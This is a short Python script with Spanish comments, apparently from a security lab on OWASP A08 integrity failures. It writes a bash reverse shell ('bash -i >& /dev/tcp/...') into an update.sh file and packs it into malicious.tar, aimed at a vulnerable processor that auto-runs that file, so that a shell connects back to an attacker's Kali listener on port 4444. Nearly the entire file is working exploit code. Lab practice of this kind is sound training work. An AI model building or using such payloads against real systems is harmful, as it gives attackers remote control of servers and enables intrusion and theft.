import tarfile
import os

KALI = "<IP_KALI>"   # IP de tu VM Kali, donde corre el listener
PUERTO = 4444

# Reverse shell: cuando el servidor víctima ejecute este script, abrirá una
# conexión de vuelta a Kali entregando una shell interactiva.
payload = f"""#!/bin/bash
bash -i >& /dev/tcp/{KALI}/{PUERTO} 0>&1
"""

os.makedirs("out", exist_ok=True)
with open("out/update.sh", "w", newline="\n") as f:
    f.write(payload)

# El procesador vulnerable ejecuta automáticamente cualquier "update.sh" que
# encuentre dentro del paquete, sin verificar firma ni integridad (A08).
with tarfile.open("out/malicious.tar", "w") as t:
    t.add("out/update.sh", arcname="update.sh")

print("Paquete malicioso creado: out/malicious.tar")